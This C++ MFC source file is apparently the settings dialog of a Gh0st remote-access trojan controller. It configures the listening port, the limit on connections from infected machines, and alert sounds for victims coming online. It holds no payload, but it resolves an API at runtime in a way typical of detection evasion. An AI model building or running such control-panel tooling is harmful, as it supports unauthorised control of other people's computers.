// SettingDlg.cpp : implementation file
//

#include "stdafx.h"
#include "DHL_yk.h"
#include "SettingDlg.h"
#include "MainFrm.h"
#include <SHLWAPI.H>

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern CMainFrame	*g_pFrame;
extern CIOCPServer	*m_iocpServer;

typedef LONG
(WINAPI
*InterlockedExchangeT)(
    __inout LONG volatile *Target,
    __in    LONG Value
    );

/////////////////////////////////////////////////////////////////////////////
// CSettingDlg dialog

CSettingDlg::CSettingDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CSettingDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CSettingDlg)
	m_connect_auto = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("设置", "nectionAuto", false);
	m_max_connections = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("设置", "MaxConnectionAuto", 10000);
	m_disable_poptips = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("设置", "poptips", false);
	m_off = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("设置", "Off");
	m_in = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("设置", "Online");
	m_set = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("设置", "Set");
	m_useautio = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("设置", "Alarm", false);
	m_bFirstShow = true;
	m_listen_port = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("设置", "ListenPort", 2012);
	//}}AFX_DATA_INIT
}

void CSettingDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CSettingDlg)
	DDX_Check(pDX, IDC_CONNECT_AUTO, m_connect_auto);
	DDX_Text(pDX, IDC_CONNECT_MAX, m_max_connections);
	DDV_MinMaxUInt(pDX, m_max_connections, 1, 100000);
	DDX_Check(pDX, IDC_DISABLE_POPTIPS, m_disable_poptips);
	DDX_Text(pDX, IDC_OFFLINE, m_off);
	DDX_Text(pDX, IDC_ONLINE, m_in);
	DDX_Text(pDX, IDC_SET, m_set);
	DDX_Check(pDX, IDC_USEORNOT, m_useautio);
	DDX_Text(pDX, IDC_LISTEN_PORT, m_listen_port);
	DDV_MinMaxUInt(pDX, m_listen_port, 1, 65535);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CSettingDlg, CDialog)
	//{{AFX_MSG_MAP(CSettingDlg)
	ON_BN_CLICKED(IDC_USEORNOT, OnUseornot)
	ON_BN_CLICKED(IDC_IFONLINE, OnIfonline)
	ON_BN_CLICKED(IDC_IFOFFLINE, OnIfoffline)
	ON_BN_CLICKED(IDC_IFSUCCESS, OnIfsuccess)
	ON_BN_CLICKED(IDC_DISABLE_POPTIPS, OnDisablePoptips)
	ON_BN_CLICKED(IDC_RESETPORT, OnResetport)
	ON_BN_CLICKED(IDC_EXIT, OnExit)
	ON_BN_CLICKED(IDC_CONNECT_AUTO, OnConnectAuto)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CSettingDlg message handlers

BOOL CSettingDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	GetDlgItem(IDC_CONNECT_MAX)->EnableWindow(!m_connect_auto);
	if (m_bFirstShow)
	{
		UpdateData(false);
	}
	m_bFirstShow = false;
	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

BOOL CSettingDlg::IsFileExist(LPCTSTR strFileName)
{
	if(strFileName == NULL)
		return FALSE;
	
	DWORD dwAttr = ::GetFileAttributes(strFileName);
	return (dwAttr!=-1 && !(dwAttr&FILE_ATTRIBUTE_DIRECTORY) );
}

CString CSettingDlg::GetOpenSoundFile()
{
	CFileDialog dlgFileOpen(FALSE,_T(".wav"),NULL,OFN_FILEMUSTEXIST,
		_T("Wav Files(*.wav)|*.wav||"),NULL);
	
	char Path[MAX_PATH];
	GetModuleFileName(NULL, Path,MAX_PATH);
	PathRemoveFileSpec(Path);
	strcat(Path,"\\sound");
	
	int StructSize = 0;
	DWORD dwVersion = GetVersion();
    if(dwVersion < 0x80000000)			//winnt/xp
		StructSize = 88;				//show new dialog
	else								//win9x
		StructSize = 76;				//show old dialog
	
	dlgFileOpen.m_ofn.lStructSize		= StructSize;
	dlgFileOpen.m_ofn.lpstrInitialDir	= _T(Path);
	if(dlgFileOpen.DoModal() == IDOK)
	{
		return (CString)dlgFileOpen.m_ofn.lpstrFile;
	}
	
	return _T("");
}

void CSettingDlg::OnUseornot() 
{
	// TODO: Add your control notification handler code here
	UpdateData(true);

	if(m_useautio)
	    SetDlgItemText(IDC_SHOW_XX, "语音提示 -> 语音播报已开启 ...");
	else
		SetDlgItemText(IDC_SHOW_XX, "语音提示 -> 语音播报已关闭 ...");

	m_useautio = ((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("设置", "Alarm", m_useautio);
}
/*
void CSettingDlg::OnDefault() 
{
	// TODO: Add your control notification handler code here
	UpdateData(true);
	char Path[MAX_PATH];
	GetModuleFileName(NULL, Path, sizeof(Path));
	PathRemoveFileSpec(Path);
	char online[MAX_PATH];
	char offline[MAX_PATH];
	char set[MAX_PATH];
	wsprintf(online,"%s%s",Path,"\\sound\\Login.wav");
	wsprintf(offline,"%s%s",Path,"\\sound\\Offline.wav");
	wsprintf(set,"%s%s",Path,"\\sound\\Setting.wav");
	SetDlgItemText(IDC_ONLINE , online);
	SetDlgItemText(IDC_OFFLINE, offline);
	SetDlgItemText(IDC_SET    , set);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString(_T("Settings"), _T("Online"), online);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString(_T("Settings"), _T("Off"), offline);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString(_T("Settings"), _T("Set"), set);
	SetDlgItemText(IDC_SHOW_XX, "恢复默认设置已完成 ...");
	Sleep(500);
	SetDlgItemText(IDC_SHOW_XX, "");
}
*/
void CSettingDlg::OnIfonline() 
{
	// TODO: Add your control notification handler code here
	CString strSoundFile = GetOpenSoundFile();
	if(IsFileExist(strSoundFile))
	{
		m_in = strSoundFile;
		UpdateData(FALSE);
	}
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString(_T("设置"), _T("Online"), m_in);
	sndPlaySound(m_in,SND_ASYNC);
}

void CSettingDlg::OnIfoffline() 
{
	// TODO: Add your control notification handler code here
	CString strSoundFile = GetOpenSoundFile();
	if(IsFileExist(strSoundFile))
	{
		m_off = strSoundFile;
		UpdateData(FALSE);
	}	
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString(_T("设置"), _T("Off"), m_off);
	sndPlaySound(m_off,SND_ASYNC);
}

void CSettingDlg::OnIfsuccess() 
{
	// TODO: Add your control notification handler code here
	CString strSoundFile = GetOpenSoundFile();
	if(IsFileExist(strSoundFile))
	{
		m_set = strSoundFile;
		UpdateData(FALSE);
	}	
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString(_T("设置"), _T("Set"), m_set);
	sndPlaySound(m_set,SND_ASYNC);
}

void CSettingDlg::OnDisablePoptips() 
{
	// TODO: Add your control notification handler code here
	UpdateData(true);
	
	if(m_disable_poptips)
	    SetDlgItemText(IDC_SHOW_XX, "上线提示 -> 上线图标闪烁已开启 ...");
	else
		SetDlgItemText(IDC_SHOW_XX, "上线提示 -> 上线图标闪烁已关闭 ...");

	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("设置", "poptips", m_disable_poptips);

	g_pFrame->IOCTrat=NULL;
	g_pFrame->OnTimerschushi(); //刷新托盘数值显示
//	Sleep(500);
//	SetDlgItemText(IDC_SHOW_XX, "");
}

void CSettingDlg::OnResetport() 
{
	// TODO: Add your control notification handler code here
	int prev_port = m_listen_port;
	int prev_max_connections = m_max_connections;
	
	UpdateData(TRUE);
	
	InterlockedExchangeT pInterlockedExchange=(InterlockedExchangeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"InterlockedExchange");
	if (prev_max_connections != m_max_connections)
	{
		if (m_connect_auto)
			pInterlockedExchange((LPLONG)&m_iocpServer->m_nMaxConnections, 10000);
		else
			pInterlockedExchange((LPLONG)&m_iocpServer->m_nMaxConnections, m_max_connections);
	}
	
	if (prev_port != m_listen_port)
		g_pFrame->Activate(m_listen_port, m_iocpServer->m_nMaxConnections);

	CIniFile m_IniFile;//设置完成播放声音
	BOOL b_chk = m_IniFile.GetInt(_T("设置"), _T("Alarm"), false);

    if (b_chk != false)
    {
		PlaySound(MAKEINTRESOURCE(IDR_WAVE3),AfxGetResourceHandle(),SND_ASYNC|SND_RESOURCE|SND_NODEFAULT);
	}

	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("设置", "ListenPort", m_listen_port);
	SetDlgItemText(IDC_SHOW_XX, "系统设置 -> 各项设定保存成功 ...");
//	Sleep(500);
//	SetDlgItemText(IDC_SHOW_XX, "");
}
/*
void CSettings::OnApply() 
{
	// TODO: Add your control notification handler code here
	int prev_port = m_listen_port;
	int prev_max_connections = m_max_connections;
	
	UpdateData(TRUE);
	
	InterlockedExchangeT pInterlockedExchange=(InterlockedExchangeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"InterlockedExchange");
	if (prev_max_connections != m_max_connections)
	{
		if (m_connect_auto)
			pInterlockedExchange((LPLONG)&m_iocpServer->m_nMaxConnections, 8000);
		else
			pInterlockedExchange((LPLONG)&m_iocpServer->m_nMaxConnections, m_max_connections);
	}
	
	if (prev_port != m_listen_port)
		g_pFrame->Activate(m_listen_port, m_iocpServer->m_nMaxConnections);
	
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "ListenPort", m_listen_port);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "MaxConnection", m_max_connections);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "MaxConnectionAuto", m_connect_auto);

	CIniFile m_IniFile;//设置完成播放声音
	BOOL b_chk = m_IniFile.GetInt(_T("Settings"), _T("Alarm"), false);

    if (b_chk != false)
    {
		PlaySound(MAKEINTRESOURCE(IDR_WAVE3),AfxGetResourceHandle(),SND_ASYNC|SND_RESOURCE|SND_NODEFAULT);
	}
	SetDlgItemText(IDC_SHOW_XX, "监听端口选项设置保存成功 ...");
	Sleep(500);
	SetDlgItemText(IDC_SHOW_XX, "");
}
*/
void CSettingDlg::OnExit() 
{
	// TODO: Add your control notification handler code here
	HWND King = ::FindWindow(NULL,_T("系统设置"));
	::PostMessage(King,WM_CLOSE,1,0);
}

void CSettingDlg::OnConnectAuto() 
{
	// TODO: Add your control notification handler code here
	UpdateData(true);
	
	if(m_connect_auto)
	    SetDlgItemText(IDC_SHOW_XX, "上线限制 -> 上线无限制开启 ...");
	else
		SetDlgItemText(IDC_SHOW_XX, "上线限制 -> 设定有限制上线 ...");

	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("设置", "nectionAuto", m_connect_auto);

	GetDlgItem(IDC_CONNECT_MAX)->EnableWindow(!m_connect_auto);
	
}
